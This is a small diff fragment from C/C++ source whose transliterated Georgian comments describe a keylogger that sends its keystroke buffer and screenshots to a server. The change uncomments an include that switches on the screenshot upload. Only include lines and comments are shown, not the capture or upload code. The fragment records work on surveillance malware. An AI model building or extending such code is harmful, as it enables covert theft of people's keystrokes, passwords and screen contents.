@@ -88,7 +88,7 @@ do
 ////////// keilogeris mier shevsebuli buferis gagzavna gasuftaveba %,%d
 #include"keylogerisBrdzaneba.cpp"
 ///////////////// suratis gagzavna serverze //////////////////
-//#include"suratisGagzavna.cpp"
+#include"suratisGagzavna.cpp"
 
 			}
 
